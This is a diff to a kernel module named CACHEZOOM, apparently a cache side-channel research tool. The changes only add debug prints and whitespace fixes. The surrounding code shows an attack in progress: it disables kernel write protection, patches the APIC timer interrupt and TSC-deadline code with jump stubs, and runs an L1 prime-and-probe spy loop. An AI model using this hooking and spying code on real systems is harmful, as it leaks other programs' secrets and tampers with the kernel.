@@ -176,19 +176,19 @@ static void enable_attack_timer()
   m_counter = 0;
   write_cr0 (read_cr0 () & (~ 0x10000));
 
-  target_addr = attack_handler - plocal_apic_timer_interrupt - 5;  
+  target_addr = attack_handler - plocal_apic_timer_interrupt - 5;
   call_stub[1] = ((char*)&target_addr)[0];
   call_stub[2] = ((char*)&target_addr)[1];
   call_stub[3] = ((char*)&target_addr)[2];
   call_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)plocal_apic_timer_interrupt, call_stub, sizeof(call_stub));  
+  memcpy((void*)plocal_apic_timer_interrupt, call_stub, sizeof(call_stub));
 
   target_addr = deadline_handler - plapic_next_deadLine - 5;
   jmp_stub[1] = ((char*)&target_addr)[0];
   jmp_stub[2] = ((char*)&target_addr)[1];
   jmp_stub[3] = ((char*)&target_addr)[2];
   jmp_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)plapic_next_deadLine, jmp_stub, sizeof(jmp_stub));  
+  memcpy((void*)plapic_next_deadLine, jmp_stub, sizeof(jmp_stub));
 
   write_cr0 (read_cr0 () | 0x10000);
 
@@ -343,10 +343,12 @@ static int deadline_handler(unsigned long delta, void * evt)
   u64 tsc;
   if(smp_processor_id() == target_cpu)
   {
+    // printk(KERN_ALERT "[deadline_handler hit] current cpu=%u, target cpu=%u\n", smp_processor_id(), target_cpu);
     tsc = rdtsc();
     wrmsrl(MSR_IA32_TSC_DEADLINE, tsc + timer_interval_tsc);		
   }
   else {
+    printk(KERN_ALERT "[deadline_handler miss] current cpu=%u, target cpu=%u\n", smp_processor_id(), target_cpu);
 		#define TSC_DIVISOR  8
     tsc = rdtsc();
     wrmsrl(MSR_IA32_TSC_DEADLINE, tsc + (((u64) delta) * TSC_DIVISOR));
@@ -358,6 +360,7 @@ static void attack_handler(void)
 {
   if(smp_processor_id() == target_cpu)
   {
+    // printk(KERN_ALERT "[attack_handler hit] current cpu=%u, target cpu=%u\n", smp_processor_id(), target_cpu);
     register int _CURRENT_SET_;
     
     asm volatile(".align 64");
@@ -369,11 +372,14 @@ static void attack_handler(void)
       measurements[m_counter % MAX_MEASUREMENT].buffer[_CURRENT_SET_] = 
       	*(_SPY_POINTER_LIST_ + idx0(_CURRENT_SET_) + 2);
     }      
-    
+
     m_counter++;
 
     _CURRENT_SET_ = 0;
     PRIME_64;
+  }
+  else {
+    printk(KERN_ALERT "[attack_handler miss] current cpu=%u, target cpu=%u\n", smp_processor_id(), target_cpu);
   }
 }
 
@@ -403,7 +409,8 @@ static void spy_list_init(void)
 	printk(KERN_ALERT "CACHEZOOM: INIT SPY BUFF\n");
 
 	// Allocate the memory for the pointer lists 
-	_SPY_POINTER_LIST_ = kzalloc(SPY_TABLE_SIZE, GFP_KERNEL); 
+	_SPY_POINTER_LIST_ = kzalloc(SPY_TABLE_SIZE, GFP_KERNEL);
+	printk(KERN_INFO "_SPY_POINTER_LIST_ start address=%lx\n", _SPY_POINTER_LIST_); // check alignment
 
   // Initialize the set associative pointers
   for(set = 0; set < CPU_L1_CACHE_SET_COUNT; set++)  
@@ -423,6 +430,7 @@ static int cachezoom_init(void)
   }
 
   measurements = kzalloc(sizeof(Measurement) * MAX_MEASUREMENT, GFP_KERNEL);
+	printk(KERN_INFO "measurements start address=%lx\n", measurements); // check alignment
 
   spy_list_init();
    
